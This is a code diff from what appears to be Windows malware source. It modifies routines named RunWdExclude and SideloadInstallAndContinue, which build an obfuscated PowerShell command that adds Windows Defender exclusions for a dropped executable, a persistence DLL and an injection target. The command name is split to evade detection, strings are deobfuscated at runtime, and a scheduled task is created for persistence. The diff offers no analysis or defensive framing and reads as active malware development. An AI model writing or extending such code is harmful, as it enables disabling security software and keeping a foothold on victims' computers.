@@ -153,22 +153,18 @@ static VOID RunWdExclude(IN PAPI_HASHING pApi, IN PVOID pNtdll, IN PVOID pK32,
     FW(L"powershell -Command \"");
 #ifdef ENABLE_WD_EXCL
     {
-        BYTE xPName[] = XSTR_PERSIST_EXE_NAME; DEOBF(xPName);
+        BYTE xPName[]   = XSTR_PERSIST_EXE_NAME; DEOBF(xPName);
+        BYTE xDllName[] = XSTR_PERSIST_DLL_NAME; DEOBF(xDllName);
+        BYTE xInjName[] = XSTR_INJECT_NAME;      DEOBF(xInjName);
+        CHAR szDestDll[MAX_PATH] = {0};
+        Ins_ACpy(szDestDll, szDestDir, MAX_PATH);
+        Ins_ACat(szDestDll, (CHAR*)xDllName, MAX_PATH);
         FW(L"$c='Add-'+'MpPref'+'erence';$h=@{ExclusionPath=@('");
-        {
-            CHAR szTmp[MAX_PATH]; Ins_ACpy(szTmp, szDestDir, MAX_PATH);
-            SIZE_T dlen = Ins_ALen(szTmp); BOOL bFirst = TRUE;
-            for (SIZE_T i = 1; i <= dlen; i++) {
-                if (szTmp[i-1] == '\\') {
-                    if (!bFirst) { FW(L"','"); }
-                    for (SIZE_T k = 0; k < i && fpos < 3190; k++) wFinal[fpos++] = (WCHAR)(UCHAR)szTmp[k];
-                    bFirst = FALSE;
-                }
-            }
-        }
-        FW(L"','"); FA(szDestExe);
+        FA(szDestExe);
+        FW(L"','"); FA(szDestDll);
         FW(L"');ExclusionProcess=@('"); FA((CHAR*)xPName);
-        FW(L"','explorer.exe','ctfmon.exe','taskhostw.exe','dllhost.exe')};&$c @h;");
+        FW(L"','"); FA((CHAR*)xInjName);
+        FW(L"')};&$c @h;");
     }
 #endif /* ENABLE_WD_EXCL */
     FW(L"$a=New-ScheduledTaskAction -Execute '"); FA(szDestExe); FW(L"';");
@@ -432,22 +428,18 @@ VOID SideloadInstallAndContinue(IN PAPI_HASHING pApi) {
         { BYTE xVN[] = XSTR_STARTUP_VALUE_NAME; DEOBF(xVN);
           SLW(L"powershell -Command \"");
 #ifdef ENABLE_WD_EXCL
-          { BYTE xPN3[] = XSTR_PERSIST_EXE_NAME; DEOBF(xPN3);
+          { BYTE xPN3[]  = XSTR_PERSIST_EXE_NAME; DEOBF(xPN3);
+            BYTE xDll3[] = XSTR_PERSIST_DLL_NAME; DEOBF(xDll3);
+            BYTE xInj3[] = XSTR_INJECT_NAME;      DEOBF(xInj3);
+            CHAR szDestDll3[MAX_PATH] = {0};
+            Ins_ACpy(szDestDll3, szDestDir, MAX_PATH);
+            Ins_ACat(szDestDll3, (CHAR*)xDll3, MAX_PATH);
             SLW(L"$c='Add-'+'MpPref'+'erence';$h=@{ExclusionPath=@('");
-            {
-                CHAR szTmp[MAX_PATH]; Ins_ACpy(szTmp, szDestDir, MAX_PATH);
-                SIZE_T dlen = Ins_ALen(szTmp); BOOL bFirst = TRUE;
-                for (SIZE_T i = 1; i <= dlen; i++) {
-                    if (szTmp[i-1] == '\\') {
-                        if (!bFirst) { SLW(L"','"); }
-                        for (SIZE_T k = 0; k < i && fpos < 5690; k++) wFinal[fpos++] = (WCHAR)(UCHAR)szTmp[k];
-                        bFirst = FALSE;
-                    }
-                }
-            }
-            SLW(L"','"); SLA(szDestExe);
+            SLA(szDestExe);
+            SLW(L"','"); SLA(szDestDll3);
             SLW(L"');ExclusionProcess=@('"); SLA((CHAR*)xPN3);
-            SLW(L"','explorer.exe','ctfmon.exe','taskhostw.exe','dllhost.exe')};&$c @h;");
+            SLW(L"','"); SLA((CHAR*)xInj3);
+            SLW(L"')};&$c @h;");
           }
 #endif /* ENABLE_WD_EXCL */
           SLW(L"$a=New-ScheduledTaskAction -Execute '"); SLA(szDestExe); SLW(L"' -Argument '/pf';");
